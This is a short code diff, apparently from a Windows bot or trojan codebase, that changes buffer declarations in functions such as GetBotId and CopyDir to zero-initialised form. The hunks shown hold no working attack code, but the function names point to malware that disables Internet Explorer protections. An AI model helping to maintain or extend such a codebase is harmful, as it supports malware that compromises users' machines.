@@ -17,8 +17,7 @@ ULONG PseudoRand(ULONG *seed)
 void GetBotId(char *botId)
 {
    CHAR windowsDirectory[MAX_PATH];
-   CHAR volumeName[8];
-   volumeName[0] = '\0';
+   CHAR volumeName[8] = { 0 };
    DWORD seed = 0;
 
    if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
@@ -358,8 +357,7 @@ void DisableMultiProcessesAndProtectedModeIe()
 
 void CopyDir(char *from, char *to)
 {
-   char fromWildCard[MAX_PATH];
-   fromWildCard[0] = '\0';
+   char fromWildCard[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(fromWildCard, from);
    Funcs::pLstrcatA(fromWildCard, "\\*");
 
@@ -372,14 +370,12 @@ void CopyDir(char *from, char *to)
 
    do
    {
-      char currFileFrom[MAX_PATH];
-      currFileFrom[0] = '\0';
+      char currFileFrom[MAX_PATH] = { 0 };
       Funcs::pLstrcpyA(currFileFrom, from);
       Funcs::pLstrcatA(currFileFrom, "\\");
       Funcs::pLstrcatA(currFileFrom, findData.cFileName);
 
-      char currFileTo[MAX_PATH];
-      currFileTo[0] = '\0';
+      char currFileTo[MAX_PATH] = { 0 };
       Funcs::pLstrcpyA(currFileTo, to);
       Funcs::pLstrcatA(currFileTo, "\\");
       Funcs::pLstrcatA(currFileTo, findData.cFileName);
